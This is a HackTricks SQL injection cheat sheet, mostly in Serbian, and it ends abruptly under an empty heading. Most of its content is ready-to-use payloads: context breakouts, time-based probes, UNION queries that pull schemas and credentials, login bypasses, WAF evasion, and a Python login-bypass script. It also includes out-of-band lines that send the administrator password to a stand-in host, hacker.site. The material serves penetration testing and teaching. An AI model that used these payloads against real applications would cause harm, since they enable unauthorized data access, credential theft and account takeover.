# SQL Injection

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetiÄku bezbednost**? Å½elite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili Å¾elite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **PridruÅ¾ite se** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji kibernetiÄki dogaÄ‘aj u **Å paniji** i jedan od najvaÅ¾nijih u **Evropi**. Sa **misijom promovisanja tehniÄkog znanja**, ovaj kongres je kljuÄno mesto susreta tehnoloÅ¡kih i kibernetiÄkih profesionalaca u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## Å ta je SQL injection?

**SQL injection** je sigurnosna greÅ¡ka koja omoguÄ‡ava napadaÄima da **ometaju upite baze podataka** aplikacije. Ova ranjivost omoguÄ‡ava napadaÄima da **pregledaju**, **izmene** ili **obriÅ¡u** podatke do kojih ne bi trebali da imaju pristup, ukljuÄujuÄ‡i informacije drugih korisnika ili bilo koje podatke do kojih aplikacija moÅ¾e da pristupi. Takve akcije mogu rezultirati trajnim promenama funkcionalnosti ili sadrÅ¾aja aplikacije, pa Äak i kompromitacijom servera ili uskraÄ‡ivanjem usluge.

## Otkrivanje taÄke ulaza

Kada se sajt Äini **ranjivim na SQL injection (SQLi)** zbog neobiÄnih odgovora servera na SQLi povezane unose, **prvi korak** je razumeti kako **ubaciti podatke u upit bez naruÅ¡avanja njega**. To zahteva identifikaciju metode za **izlazak iz trenutnog konteksta** na efikasan naÄin.
Ovo su neki korisni primeri:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
Zatim, morate znati kako **popraviti upit da ne bude greÅ¡aka**. Da biste popravili upit, moÅ¾ete **uneti** podatke tako da **prethodni upit prihvati nove podatke**, ili jednostavno moÅ¾ete **uneti** svoje podatke i **dodati simbol komentara na kraju**.

Napomena: Ako moÅ¾ete videti poruke o greÅ¡kama ili primetiti razlike kada upit radi i kada ne radi, ova faza Ä‡e biti lakÅ¡a.

### **Komentari**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Potvrda pomoÄ‡u logiÄkih operacija

Pouzdan naÄin potvrde ranjivosti SQL ubacivanja ukljuÄuje izvrÅ¡avanje **logiÄke operacije** i posmatranje oÄekivanih rezultata. Na primer, GET parametar poput `?username=Peter` koji daje isti rezultat kada se izmeni u `?username=Peter' or '1'='1` ukazuje na ranjivost SQL ubacivanja.

SliÄno tome, primena **matematiÄkih operacija** sluÅ¾i kao efikasna tehnika potvrde. Na primer, ako pristupanje `?id=1` i `?id=2-1` proizvodi isti rezultat, to ukazuje na SQL ubacivanje.

Primeri koji demonstriraju potvrdu logiÄke operacije:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Ova lista reÄi je napravljena kako bi se pokuÅ¡alo **potvrditi SQL ubacivanje** na predloÅ¾eni naÄin:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### PotvrÄ‘ivanje pomoÄ‡u vremena

U nekim sluÄajevima **neÄ‡ete primetiti nikakvu promenu** na stranici koju testirate. Stoga, dobar naÄin da **otkrijete slepo SQL ubacivanje** je da naterate bazu podataka da izvrÅ¡i radnje koje Ä‡e **uticati na vreme** potrebno za uÄitavanje stranice.\
Stoga, dodajemo u SQL upit operaciju koja Ä‡e dugo trajati da se izvrÅ¡i:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
U nekim sluÄajevima **neÄ‡e biti dozvoljene funkcije za uspavljivanje**. Tada, umesto koriÅ¡Ä‡enja tih funkcija, moÅ¾ete napraviti upit koji Ä‡e **izvrÅ¡avati sloÅ¾ene operacije** koje Ä‡e trajati nekoliko sekundi. _Primeri ovih tehnika Ä‡e biti posebno komentarisani za svaku tehnologiju (ako postoje)_.

### Identifikacija Back-end-a

Najbolji naÄin za identifikaciju back-end-a je pokuÅ¡aj izvrÅ¡avanja funkcija razliÄitih back-end-ova. MoÅ¾ete koristiti _**sleep**_ **funkcije** iz prethodne sekcije ili ove (tabela sa [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
TakoÄ‘e, ako imate pristup rezultatima upita, moÅ¾ete **ispisati verziju baze podataka**.

{% hint style="info" %}
NastaviÄ‡emo da razmatramo razliÄite metode za iskoriÅ¡Ä‡avanje razliÄitih vrsta SQL Injection. Kao primer koristimo MySQL.
{% endhint %}

### Identifikacija pomoÄ‡u PortSwigger-a

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## IskoriÅ¡Ä‡avanje bazirano na Uniji

### Otkrivanje broja kolona

Ako moÅ¾ete videti rezultate upita, ovo je najbolji naÄin za iskoriÅ¡Ä‡avanje.\
Prvo, moramo saznati **broj** **kolona** koje **poÄetni zahtev** vraÄ‡a. To je zato Å¡to **oba upita moraju vratiti isti broj kolona**.\
Za ovo se obiÄno koriste dve metode:

#### Order/Group by

Da biste odredili broj kolona u upitu, postepeno prilagoÄ‘avajte broj koji se koristi u klauzulama **ORDER BY** ili **GROUP BY** dok ne dobijete laÅ¾an odgovor. Bez obzira na razliÄite funkcionalnosti **GROUP BY** i **ORDER BY** u SQL-u, oba se mogu koristiti na isti naÄin za odreÄ‘ivanje broja kolona upita.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

Izaberite sve viÅ¡e i viÅ¡e null vrednosti dok upit ne bude ispravan:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_Treba da koristite `null` vrednosti jer u nekim sluÄajevima tip kolona sa obe strane upita mora biti isti, a null je validan u svakom sluÄaju._

### Izdvajanje imena baza podataka, imena tabela i imena kolona

U sledeÄ‡im primerima Ä‡emo izvuÄ‡i ime svih baza podataka, ime tabele iz baze podataka i imena kolona iz tabele:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Postoji razliÄit naÄin za otkrivanje ovih podataka na svakoj razliÄitoj bazi podataka, ali metodologija je uvek ista._

## IskoriÅ¡Ä‡avanje skrivenog unije baziranog

Kada je izlaz upita vidljiv, ali unije bazirane na ubrizgavanju izgledaju nedostiÅ¾ne, to ukazuje na prisustvo **skrivenog unije baziranog ubrizgavanja**. Ova situacija Äesto dovodi do slepog ubrizgavanja. Da biste pretvorili slepo ubrizgavanje u unije bazirano, potrebno je da se sazna izvrÅ¡avanje upita na pozadini.

To se moÅ¾e postiÄ‡i koriÅ¡Ä‡enjem tehnika slepog ubrizgavanja zajedno sa podrazumevanim tabelama specifiÄnim za ciljni sistem za upravljanje bazom podataka (DBMS). Da biste razumeli ove podrazumevane tabele, savetuje se konsultacija dokumentacije ciljnog DBMS-a.

Nakon Å¡to je upit izvuÄen, neophodno je prilagoditi svoj payload kako bi se bezbedno zatvorio originalni upit. Zatim se unija upita dodaje vaÅ¡em payloadu, olakÅ¡avajuÄ‡i iskoriÅ¡Ä‡avanje novo dostupnog unije baziranog ubrizgavanja.

Za detaljnije informacije, pogledajte kompletan Älanak dostupan na [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## IskoriÅ¡Ä‡avanje greÅ¡aka bazirano

Ako iz nekog razloga **ne moÅ¾ete** videti **izlaz** upita, ali moÅ¾ete **videti poruke o greÅ¡kama**, moÅ¾ete iskoristiti ove poruke o greÅ¡kama da **izfiltrirate** podatke iz baze podataka.\
PrateÄ‡i sliÄan tok kao kod iskoriÅ¡Ä‡avanja unije baziranog ubrizgavanja, moÅ¾ete uspeti da izvuÄete bazu podataka.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## IskoriÅ¡Ä‡avanje slepe SQLi

U ovom sluÄaju ne moÅ¾ete videti rezultate upita ili greÅ¡ke, ali moÅ¾ete **razlikovati** kada upit **vrati** odgovor **taÄno** ili **netaÄno** jer se na stranici nalaze razliÄiti sadrÅ¾aji.\
U ovom sluÄaju, moÅ¾ete zloupotrebiti to ponaÅ¡anje kako biste postepeno izvukli karaktere iz baze podataka:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## IskoriÅ¡Ä‡avanje Slepe SQLi GreÅ¡ke

Ovo je **isti sluÄaj kao i prethodni**, ali umesto razlikovanja izmeÄ‘u taÄnog/netaÄnog odgovora iz upita, moÅ¾ete razlikovati da li postoji **greÅ¡ka** u SQL upitu ili ne (moÅ¾da zbog pada HTTP servera). Stoga, u ovom sluÄaju moÅ¾ete izazvati SQL greÅ¡ku svaki put kada taÄno pogodite karakter:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## IskoriÅ¡Ä‡avanje SQLi bazirano na vremenu

U ovom sluÄaju **nema** naÄina da se **razlikuje** odgovor upita na osnovu konteksta stranice. MeÄ‘utim, moÅ¾ete uÄiniti da se stranica **duÅ¾e uÄitava** ako je pogodno pretpostavljeno slovo taÄno. VeÄ‡ smo videli ovu tehniku u upotrebi ranije kako bismo [potvrdili SQLi ranjivost](./#potvrda-pomoÄ‡u-vremena).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Stacked Queries

MoÅ¾ete koristiti "stacked queries" da biste **izvrÅ¡ili viÅ¡e upita jedan za drugim**. Imajte na umu da se dok se izvrÅ¡avaju sledeÄ‡i upiti, **rezultati ne vraÄ‡aju aplikaciji**. Stoga je ova tehnika uglavnom korisna u vezi sa **slepim ranjivostima**, gde moÅ¾ete koristiti drugi upit da pokrene DNS pretragu, uslovnu greÅ¡ku ili kaÅ¡njenje vremena.

**Oracle** ne podrÅ¾ava **stacked queries**. **MySQL, Microsoft** i **PostgreSQL** ih podrÅ¾avaju: `UPIT-1-OVDE; UPIT-2-OVDE`

## Eksploatacija van mreÅ¾e

Ako **nijedna druga** metoda eksploatacije **nije uspela**, moÅ¾ete pokuÅ¡ati da **izvuÄete informacije iz baze podataka** na **spoljni server** koji je pod vaÅ¡om kontrolom. Na primer, putem DNS upita:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### IzvlaÄenje podataka putem XXE-a izvan opsega

XXE (Eksterni XML Entitet) je sigurnosna ranjivost koja omoguÄ‡ava napadaÄu da izvrÅ¡i udaljene zahteve i izvuÄe podatke izvan opsega aplikacije. Ova tehnika se moÅ¾e koristiti za izvlaÄenje osetljivih informacija iz baze podataka putem XML eksternih entiteta.

Da biste iskoristili ovu ranjivost, prvo morate pronaÄ‡i mesto gde se koristi XML parser koji podrÅ¾ava eksterne entitete. Zatim, moÅ¾ete konstruisati poseban XML payload koji Ä‡e izvrÅ¡iti udaljeni zahtev i vratiti osetljive podatke.

Na primer, moÅ¾ete konstruisati payload koji Ä‡e izvrÅ¡iti SQL upit na bazi podataka i vratiti rezultate. Ovi rezultati mogu biti ukljuÄeni u XML odgovor koji Ä‡e biti poslat napadaÄu.

Da biste izvrÅ¡ili ovu tehniku, koristite sledeÄ‡e korake:

1. PronaÄ‘ite mesto gde se koristi XML parser koji podrÅ¾ava eksterne entitete.
2. KonstruiÅ¡ite XML payload koji Ä‡e izvrÅ¡iti udaljeni zahtev i vratiti osetljive podatke.
3. PoÅ¡aljite payload na ciljnu aplikaciju i pratite odgovor kako biste izvukli osetljive podatke.

VaÅ¾no je napomenuti da je ova tehnika vrlo moÄ‡na i moÅ¾e biti zloupotrebljena. Stoga je vaÅ¾no da se koristi samo u okviru zakonitog pentestinga i sa dozvolom vlasnika sistema.
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Automatizovano iskoriÅ¡Ä‡avanje

Proverite [SQLMap Cheetsheat](sqlmap/) da biste iskoristili SQLi ranjivost sa [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## TehniÄke specifiÄnosti

VeÄ‡ smo razgovarali o svim naÄinima iskoriÅ¡Ä‡avanja SQL Injection ranjivosti. PronaÄ‘ite joÅ¡ neke trikove koji zavise od tehnologije baze podataka u ovoj knjizi:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Ili Ä‡ete pronaÄ‡i **mnogo trikova u vezi sa: MySQL, PostgreSQL, Oracle, MSSQL, SQLite i HQL na** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji kibernetiÄki dogaÄ‘aj u **Å paniji** i jedan od najvaÅ¾nijih u **Evropi**. Sa **misijom promovisanja tehniÄkog znanja**, ovaj kongres je kljuÄno mesto susreta tehnoloÅ¡kih i kibernetiÄkih profesionalaca u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## ZaobilaÅ¾enje autentifikacije

Lista za pokuÅ¡aj zaobilaÅ¾enja funkcionalnosti prijave:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### ZaobilaÅ¾enje autentifikacije putem sirovog heÅ¡a
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Ova upit pokazuje ranjivost kada se MD5 koristi sa true za sirovi izlaz u proveri autentifikacije, Äime se sistem Äini podloÅ¾nim SQL ubacivanju. NapadaÄi mogu iskoristiti ovo tako Å¡to Ä‡e oblikovati unose koji, kada se heÅ¡iraju, proizvode neoÄekivane delove SQL komandi, Å¡to dovodi do neovlaÅ¡Ä‡enog pristupa.
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
sha1("3fDf ", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!
```
### Bypass autentifikacije putem ubacivanja hash-a

Ova tehnika se koristi za zaobilaÅ¾enje autentifikacije putem ubacivanja hash-a u SQL upit. Kada se koristi loÅ¡a implementacija autentifikacije koja ne proverava ispravnost unetih podataka, moguÄ‡e je iskoristiti SQL Injection da bi se umesto pravog hash-a ubacio laÅ¾ni hash.

Da bi se ova tehnika primenila, potrebno je prvo dobiti pravi hash koji se koristi za autentifikaciju. Zatim se taj hash ubacuje u SQL upit umesto unetog korisniÄkog imena i lozinke. Na taj naÄin se zaobilazi provera autentifikacije i omoguÄ‡ava pristup sistemskim resursima.

Ova tehnika je vrlo opasna i moÅ¾e dovesti do ozbiljnog kompromitovanja sistema. Zbog toga je vaÅ¾no da se implementira sigurna autentifikacija koja proverava ispravnost unetih podataka i spreÄava SQL Injection napade.
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**PreporuÄena lista**:

Kao korisniÄko ime trebate koristiti svaku liniju iz liste, a kao lozinku uvijek: _**Pass1234.**_\
_(Ove payloade takoÄ‘er moÅ¾ete pronaÄ‡i u velikoj listi spomenutoj na poÄetku ovog odjeljka)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK Bypass autentifikacije

Ako se ' izbjegava, moÅ¾ete koristiti %A8%27, a kada se ' izbjegne, stvorit Ä‡e se: 0xA80x5c0x27 (_â•˜'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Python skripta:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Poliglotna injekcija (viÅ¡ekontekstualna)

Polyglot injection, also known as multicontext injection, is a technique used in SQL injection attacks. It involves crafting a malicious payload that can be interpreted as valid code in multiple database management systems (DBMS). This allows the attacker to target different DBMS with a single payload, increasing the chances of a successful attack.

Polyglot injection takes advantage of the syntax and behavior differences between different DBMS. By carefully constructing the payload, the attacker can ensure that it is interpreted correctly by multiple DBMS, regardless of the specific syntax requirements of each system.

This technique is particularly useful when the attacker is unsure about the underlying DBMS used by the target application. By using a polyglot payload, the attacker can increase the likelihood of a successful SQL injection attack, regardless of the specific DBMS in use.

It is important to note that crafting a polyglot injection payload requires a deep understanding of the syntax and behavior of multiple DBMS. Additionally, the payload must be carefully constructed to avoid any syntax conflicts or errors that could prevent successful exploitation.

Overall, polyglot injection is a powerful technique that allows attackers to target multiple DBMS with a single payload, increasing the chances of a successful SQL injection attack.
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### Promena lozinke postojeÄ‡eg objekta/korisnika

Da biste to uradili, trebali biste pokuÅ¡ati **kreirati novi objekat sa istim imenom kao "glavni objekat"** (verovatno **admin** u sluÄaju korisnika) i izmeniti neÅ¡to:

* Kreirajte korisnika sa imenom: **AdMIn** (velika i mala slova)
* Kreirajte korisnika sa imenom: **admin=**
* **SQL Truncation napad** (kada postoji neka vrsta **ograniÄenja duÅ¾ine** za korisniÄko ime ili email) --> Kreirajte korisnika sa imenom: **admin \[mnogo razmaka] a**

#### SQL Truncation napad

Ako je baza podataka ranjiva i maksimalan broj karaktera za korisniÄko ime je na primer 30, a Å¾elite da se predstavite kao korisnik **admin**, pokuÅ¡ajte da kreirate korisniÄko ime nazvano: "_admin \[30 razmaka] a_" i bilo koju lozinku.

Baza podataka Ä‡e **proveriti** da li uneto **korisniÄko ime postoji** u bazi podataka. Ako **ne postoji**, ona Ä‡e **skratiti** korisniÄko ime na **maksimalan dozvoljeni broj karaktera** (u ovom sluÄaju na: "_admin \[25 razmaka]_") i automatski Ä‡e ukloniti sve razmake na kraju, aÅ¾urirajuÄ‡i unutar baze podataka korisnika "**admin**" sa **novom lozinkom** (mogu se pojaviti neke greÅ¡ke, ali to ne znaÄi da nije uspelo).

ViÅ¡e informacija: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Napomena: Ovaj napad viÅ¡e neÄ‡e raditi kao Å¡to je opisano u najnovijim instalacijama MySQL-a. Iako poreÄ‘enja i dalje ignoriÅ¡u razmake na kraju podrazumevano, pokuÅ¡aj da se unese string koji je duÅ¾i od duÅ¾ine polja rezultiraÄ‡e greÅ¡kom i neÄ‡e biti moguÄ‡e izvrÅ¡iti unos. Za viÅ¡e informacija o ovoj proveri: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQL Insert provera bazirana na vremenu

Dodajte onoliko `','',''` koliko smatrate da je potrebno da izaÄ‘ete iz izjave VALUES. Ako se izvrÅ¡i kaÅ¡njenje, imate SQLInjection.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

Klauzula `ON DUPLICATE KEY UPDATE` u MySQL-u se koristi da se specificiraju akcije koje baza podataka treba preduzeti kada se pokuÅ¡a umetnuti red koji bi rezultirao dupliranom vrednoÅ¡Ä‡u u UNIQUE indeksu ili PRIMARY KEY. SledeÄ‡i primer prikazuje kako se ova funkcionalnost moÅ¾e iskoristiti da se izmeni lozinka administratorskog naloga:

Primer Payload Injection:

Payload za ubacivanje moÅ¾e biti kreiran na sledeÄ‡i naÄin, gde se pokuÅ¡ava ubaciti dva reda u tabelu `users`. Prvi red je mamac, a drugi red cilja postojeÄ‡i administratorski email sa namerom da se aÅ¾urira lozinka:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Evo kako to funkcioniÅ¡e:

- Upit pokuÅ¡ava da unese dva reda: jedan za `generic_user@example.com` i drugi za `admin_generic@example.com`.
- Ako red za `admin_generic@example.com` veÄ‡ postoji, klauza `ON DUPLICATE KEY UPDATE` se aktivira, nareÄ‘ujuÄ‡i MySQL-u da aÅ¾urira polje `password` postojeÄ‡eg reda na "bcrypt_hash_of_newpassword".
- Kao rezultat toga, autentifikacija se moÅ¾e pokuÅ¡ati koristeÄ‡i `admin_generic@example.com` sa lozinkom koja odgovara bcrypt hash-u ("bcrypt_hash_of_newpassword" predstavlja bcrypt hash nove lozinke, koji treba zameniti stvarnim hash-om Å¾eljene lozinke).

### IzvlaÄenje informacija

#### Kreiranje 2 naloga istovremeno

Prilikom pokuÅ¡aja kreiranja novog korisnika, potrebni su korisniÄko ime, lozinka i email:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### KoriÅ¡Ä‡enje decimalnog ili heksadecimalnog broja

PomoÄ‡u ove tehnike moÅ¾ete izvuÄ‡i informacije kreirajuÄ‡i samo 1 nalog. VaÅ¾no je napomenuti da ne morate komentarisati niÅ¡ta.

KoriÅ¡Ä‡enje **hex2dec** i **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Da biste dobili tekst, moÅ¾ete koristiti:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
KoriÅ¡Ä‡enje **hex** i **replace** (i **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji dogaÄ‘aj u oblasti kibernetiÄke bezbednosti u **Å paniji** i jedan od najvaÅ¾nijih u **Evropi**. Sa **misijom promovisanja tehniÄkog znanja**, ovaj kongres je vrelo sastajaliÅ¡te za profesionalce iz oblasti tehnologije i kibernetiÄke bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL injection

Routed SQL injection je situacija u kojoj ubacivaÄki upit nije onaj koji daje izlaz, veÄ‡ izlaz ubacivaÄkog upita ide u upit koji daje izlaz. ([Iz dokumenta](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Primer:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## Bypass WAF

[PoÄetni zaobiÄ‘eni odavde](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### ZaobiÄ‘enje bez razmaka

Bez razmaka (%20) - zaobiÄ‘eno koriÅ¡Ä‡enjem alternativa za razmake
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
## No Whitespace - zaobilaÅ¾enje koriÅ¡Ä‡enjem komentara

### Opis

